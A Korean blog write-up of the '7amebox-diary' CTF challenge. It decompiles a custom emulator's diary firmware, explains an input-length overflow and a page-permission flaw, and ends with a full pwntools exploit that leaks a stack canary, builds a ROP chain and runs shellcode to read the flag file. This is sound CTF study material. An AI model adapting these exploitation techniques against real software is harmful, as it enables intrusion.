---
layout: post
title: "7amebox-diary"
comments : true
category : War Game
---

# 문제
***

7amebox-diary 문제도 앞의 7amebox-name, 7amebox-tiny_adventure와 마찬가지로 emulator를 통해서 firmware를 실행하는 문제이다. 따라서 decompile을 했다. 


decompile한 결과를 c 코드로 나타내면 다음과 같다.
```

r9 => 생성한 난수
*(r10) => diary 개수
*(r10 + X*3) => diary의 주소

int main()
{
    r10 = mmap(0, 0x1000, PROT_READ | PROT_WRITE);
    r9 = rand(0, (1<<21)-1 )    # 1 - 2**21-1 사이의 난수 생성
    call 0x27;
    exit(0);
}

sub_0x27()
{
    *(ebp-3) = r9;
    call 0xea   # memset(r10,0,0x1e+3);
  
    while(1)
    {
        r0 = ebp-6;
        r1=3;
        call 0x60f;   # read(0,r0,r1);
        
        r6 &= 0b111111111111110000000
        r6 |= LOBYTE(*(ebp-6));
        
        switch(LOBYTE(r6))
        {
            case 0x31:  
                call 0x12e;   # 1.list
                break;
            case 0x32:
                call 0x1f0;   # 2.write
                break:
            case 0x33:
                call 0x319;   # 3.show
                break;
            case 0x34:
                call 0x452;   # 4.edit
                break;
            case 0x35:   # 5. quit
                if (*(ebp-3) != r9)
                    call 0x59d;
                return;
        }
    }
}

sub_0x12e()   # 1.list
{
    *(ebp-3) = r9;
    *(ebp-6) = 1;
    while(1)
    {
        r6 = *(ebp-6)
        r5= *(r10)
        if ( r6 > r5 )
            break;
        *(ebp-9) = r6 + 0x30;
        *(ebp-8) = 0x29   # ")"
        *(ebp-7) = 0
        printf("%s", ebp-9);
        
        r0 = *(ebp-6);
        call 0x6b4;   # r0 = *(r10 + r0 * 3)
        call 0x661;   # r1 = strlen(r0); write(1,r0,r1);
        * (ebp -6) += 1;
    }
    
    if (*(ebp-3) != r9)
        call 0x59d;
    return;
}

sub_0x1f0()   # 2.write
{
    *(ebp-3) = r9;
    r6 = *(r10);
    if ( r6 < 9)
    {
        r6 += 1;
        *(r10) = r6;
        *(ebp-6) = mmap(0,0x1000, PROT_READ | PROT_WRITE);
        *(r10 + r6 * 3) = *(ebp-6);
        r0 = *(ebp-6);
        r1= 0x1e;
        call 0x60f;   # r0 = read(0,r0,r1); title을 입력 
        r0 -= 1;
        (byte)(*(ebp-6) + r0) = 0;
        
        r0 = *(ebp-6) + 0x1e;
        r1 = 0x4b0;
        call 0x60f;   # r0 = read(0,r0,r1); content 입력
        r0 -= 1;
        (byte)(*(ebp-6) + 0x1e + r0 ) = 0;
        
        r1 = r0;
        r0 = *(ebp-6) + 0x4ec;
        call 0x60f;   # secret_key 입력
        
        r6 = *(ebp-6) + 0x1e;
        r7 = *(ebp-6) + 0x4ec;
        r5 = 0;
        r4 = 0;
        
        for(i=0;i<0x4b0;i++)
        {
            byte 붙이기
            r5 = *((byte *)r6);
            r4 = *((byte *)r7);
            
            *((byte *)r6) = r4 ^ r5;
            r6 += 1;
            r7 += 1;
        }
        
    }
    
    if (*(ebp-3) != r9)
        call 0x59d;
    return;  
        
}

sub_0x319()   # 3.show
{
    *(ebp-3) = r9;
    r1 = 2;
    r0 = ebp - 6;
    call 0x60f;   # read(0,r0,r1);
    
    r6 &= 0b111111111111110000000
    r6 |= LOBYTE(*(ebp-6));
    
    if ( LOBYTE(r6) <= 0x39 && LOBYTE(r6) >= 0x31)
    {
        r6 -= 0x30;
        r7 = *(r10);
        
        if (LOBYTE(r6) <= r7)
        {
            r0 = r6;
            call 0x6b4;   # r0 = *(r10 + (r0 * 3));
            *(ebp-9) = r0;
            r0 = *(ebp-6);
            call 0x661;   # r1 = strlen(r0); write(1,r0,r1);
            
            r2 = 0x4b0;
            r1 = *(ebp-9) + 0x1e;
            r0 = ebp - 0x4b9;
            call 0x5d9;   # memcpy(r0,r1,r2);
            
            for(i=0;i<0x4b0;i++)
            {
                r6 = ebp - 0x4b9;
                r7 = *(ebp-9) + 0x4ec;
                
                r5 = *((byte)r6);
                r4 = *((byte)r7);
                
                *((byte)r6) = r4 ^ r5;
                
                r6 += 1;
                r7 += 1;
            }
            
            r0 = ebp - 0x4b9;
            call 0x661;
        }
            
    }
    
    if (*(ebp-3) != r9)
        call 0x59d;
    return;      
}

sub_0x452()   # 4.edit
{
    *(ebp-3) = r9;
    r1 = 2;
    r0 = ebp - 6;
    call 0x60f;
    
    r6 &= 0b111111111111110000000
    r6 |= LOBYTE(*(ebp-6));
    
    if ( LOBYTE(r6) <= 0x39 && LOBYTE(r6) >= 0x31)
    {
        r6 -= 0x30;
        r7 = *(r10);
        
        if ( LOBYTE(r6) <= r7 )
        {
            r0 =r6;
            call 0x6b4;   # r0 = *(r10 + (r0 * 3))
            *(ebp-9) = r0;
            
            r0 = *(ebp-9);
            r1 = 0x1e;
            call 0x60f;   # title 입력, r0 = read(0,r0,r1);
            r0 -= 1;
            r6 = *(ebp-9) + r0
            *((byte)r6) = 0;
            
            r0 = *(ebp-9) + 0x1e;
            r1 = 0x4b0;
            call 0x60f;   # content 입력, r0 = read(0,r0,r1);
            r0 -= 1;
            r6 = *(ebp-9) + 0x1e + r0;
            *((byte)r6) = 0;
            
            r6 = *(ebp-9) + 0x1e;
            r7 = *(ebp-9) + 0x4ec;
            r5 = 0;
            r4 = 0;
            
            for(i=0;i<0x4b0;i++)
            {
                r5 = *((byte)r6);
                r4 = *((byte)r7);
                
                *((byte)r6) = r4 ^ r5;
                
                r6 += 1;
                r7 += 1;  
            }
        }
    }
    
    if (*(ebp-3) != r9)
        call 0x59d;
    return;  
}

sub_0x59d()
{
    exit(0);
}

sub_0x60f()
{
    push r1;
    push r2;
    push r3;
    push r9;
    r0 = read(0,r0,r1);
    pop r6
    if (r6 != r9)
        call 0x59d;
    ...
}
```

해당 firmware는 diary를 만드는 동작을 수행한다. 

__sub_0x12e()__ 를 호출하면 diary title을 출력해준다. (1.list)

__sub_0x1f0()__ 를 호출하면 title과 content, secret_key를 입력 받고 content를 secret_key로 암호화한 후 저장한다. (2.write)

__sub_0x319()__ 를 호출하면 입력 받은 숫자에 해당하는 diary content를 출력해준다. (3.show)

__sub_0x452()__ 를 호출하면 diary content를 수정할 수 있다. (4.edit)



__sub_0x1f0()__ (2.write)에서 secret_key를 입력할 때 입력 가능한 길이는 입력한 content의 길이 -1 이다. 따라서 입력한 content의 길이가 0이면 secret_key를 입력할 때 Stdin class의 sys.stdin.readline(size)의 size로 -1을 넣을 수 있다. (파이썬에서 -1이 unsigned 값으로 얼마인지는 모르겠다. 그리고 sys.stdin.readline()의 인자로 -1이 들어가면 얼만큼 입력을 받는지 모르겠지만 엄청 큰 길이의 입력을 read한다.) 


content의 길이가 0이 되도록 할 수 있는지 보기 위해서  _7amebox_patched.py 내에 구현된 Stdin class를 살펴보았다.

```
class Stdin:
    def read(self, size):
        res = ''
        buf = sys.stdin.readline(size)
        for ch in buf:
            if ord(ch) > 0b1111111:
                break
            if ch == '\n':
                res += ch
                break
            res += ch
        return res
```



read 메소드는 입력 받은 buf의 한 바이트가 0x80 이상의 값을 가지면 for문을 빠져나오고 res를 return하게 된다. 따라서 content를 입력할 때 첫 바이트가 0x80 이상의 값을 갖게 하면 content의 길이를 0으로 할 수 있고 이를 통해 buffer overflow를 발생시킬 수 있다. 



_7amebox_patched.py 내에는 취약점이 하나 더 존재한다.

```
def write_memory(self, addr, data, length):
...
    if self.memory.check_permission(addr, PERM_WRITE) and self.memory.check_permiss$
        for offset in range(length):
            self.memory[addr + offset] = data[offset] & 0b1111111
...
```


메모리에 write를 할 때 write를 시작하는 처음 페이지와 마지막 페이지에만 write 권한이 있으면 중간에 있는 페이지는 write 권한이 없어도 write가 가능하다는 점이다.



위의 두 취약점을 이용하면 flag를 읽어올 수 있다.


page 할당 순서 및 stack 주소 


1.0x59000 (diary list) 메모리 구조 <br/>
  =>  \| diary 개수 \| 첫 번째 diary 주소 \| 두 번째 diary 주소 \| ... <br/>
2.0xc4000 (첫 번째 diary) <br/>
3.0x1c000 <br/>
4.0x3a000 <br/><br/>
... <br/><br/>
8.0xf1000 <br/>
9.0x7c000 <br/>

stack 주소 : 0xf4000 - 0xf6000

## exploit 방법
1. 세 번째 다이어리에서 bof를 발생시켜서 diary list에 저장된 첫 번째 diary 주소를 __sub_0x27()__ 의 ebp-3 주소 (canary 위치)로 덮어쓴다. (이렇게 하면 두 번째 diary 주소의 첫 바이트에 0x0a가 들어가는데 다행히 이 주소는 read 권한이 있는 페이지여서 2번에서 error가 발생하지 않는다.)
2. 입력으로 "1"을 넣어서 다이어리 리스트를 출력한다. 이를 통해서 canary leak을 할 수 있다.
3. 여덟 번째 다이어리에서 bof를 발생시키면 stack 영역을 덮어쓸 수 있다. 
4. 입력으로 flag 파일을 pipline에 추가하고 flag 파일을 읽어오는 코드를 넣어준다. 

```
sub_0x60f()
{
    ...
    0x617:    op_x4    mov r3, r1
    0x619:    op_x4    mov r2, r0
    0x61b:    op_x4    mov r1, 0x0
    0x620:    op_x4    mov r0, 0x3
    0x625:    op_x8    syscall (r0) # secret_key 입력
    0x627:    op_x7    pop r6
    0x629:    op_x23   cmp r6, r9
    0x62b:    op_x28   jne 0x59d
    0x630:    op_x7    pop r3
    0x632:    op_x7    pop r2
    0x634:    op_x7    pop r1
    0x636:    op_x7    ret
    ...
}
``` 
<br/>
canary 값을 우회한 뒤 flag 값을 읽어오기 위해서 ROP chain을 다음과 같이 구성한다.

------------esp---------------

\| 쓰레기 값 \| canary \| "A" * 9 \| pr2_pr1_pr0_ret \| 0x7 \| 0xf5000 \| 0x4 \| syscall (0x625) \| canary \| "A" * 9 \| pr2_pr1_pr0_ret \| "AAA" \| 0x200 \| 0x7c000 \| 0x60f \| 0x7c000 + 5 \|


# 풀이 
```
#!/usr/bin/python

from pwn import *
import time

file_path="/home/sungyun/round2/7amebox-diary/vm_diary.py"

def write_tri(data):

        buf=[0 for i in range(3)]

        buf[0] = chr(data  & 0b000000000000001111111)
        buf[1] = chr((data & 0b111111100000000000000)>>14)
        buf[2] = chr((data & 0b000000011111110000000) >>7)
	return "".join(buf)

def read_tri(value):
	tri = 0
	tri |= ord(value[0])
	tri |= ord(value[1])  << 14
	tri |= ord(value[2])  << 7
	return tri

def write_diary(title,content,sec_key):
	p.recvuntil(">")
	p.sendline("2")
	p.recvuntil(">")
	p.sendline(title)
	p.recvuntil(">")
	p.sendline(content)
	time.sleep(0.1)
	p.sendline(sec_key)

def mov_reg_value(dreg,value):
	op=0x12
	opers=0x10*dreg

	return chr(op)+chr(opers)+write_tri(value)

def sys_call():
	op=0x20
	oper=0x0
	return chr(op)+chr(oper)

p=process(['python','-u',file_path])

stack=0xf4000
sub_0x27_ebp=0x1fe0+0xf4000-9
sub_0x27_ret=sub_0x27_ebp+3
canary_loc=sub_0x27_ebp-3

write_diary("merry_christmas","sungyun_","lonely~")
write_diary("happy_new_year","3ffr3s__","lonely~")

pay="A"*(0x59000-(0x3a000+0x4ec))
pay+=write_tri(0x3)
pay+=write_tri(canary_loc)

write_diary("1eak_c4n4ry","\xff",pay)


# print list => leak canary

p.recvuntil(">")
p.sendline("1")
p.recvuntil("-\n")

p.recvuntil("1)")
canary=read_tri(p.recv(3))

for i in range(4):
	write_diary("t00_h4rd","7amebox","diary_")


sub_60f_canary_loc=0xf5fb6
write_ebp=0xf5fcb
pr2_pr1_pr0_ret=0x607
pbp_ret=0x315
malloc_n_write=0x228
exec_page=0xdd000
syscall=0x625


pay2="A"*(sub_60f_canary_loc-(0xf1000+0x4ec))
pay2+=write_tri(canary)
pay2+="A"*9
pay2+=write_tri(pr2_pr1_pr0_ret)	#sub_0x60f ret
pay2+=write_tri(0x7)
pay2+=write_tri(0xf5000)
pay2+=write_tri(0x4)
pay2+=write_tri(syscall)
pay2+=write_tri(canary)
pay2+="A"*9
pay2+=write_tri(pr2_pr1_pr0_ret)
pay2+="AAA"
pay2+=write_tri(0x200)
pay2+=write_tri(0x7c000)
pay2+=write_tri(0x60f)	#read(0,r0,r1)
pay2+=write_tri(0x7c000+5)

write_diary("1_will_exp1oit","\xff",pay2)


# self.pipeline.append("flag")
# r0 = fd

shell="flag\x00"    
shell+=mov_reg_value(1,0x7c000)
shell+=mov_reg_value(0,1)
shell+=sys_call()

# read(fd,0xf5000,0x100)

shell+=mov_reg_value(1,2)
shell+=mov_reg_value(2,0xf5000)
shell+=mov_reg_value(3,0x100)
shell+=mov_reg_value(0,3)
shell+=sys_call()

# write(1,0xf5000,0x100)

shell+=mov_reg_value(1,1)
shell+=mov_reg_value(0,2)
shell+=sys_call()

p.sendline(shell)

print p.recvline()

```

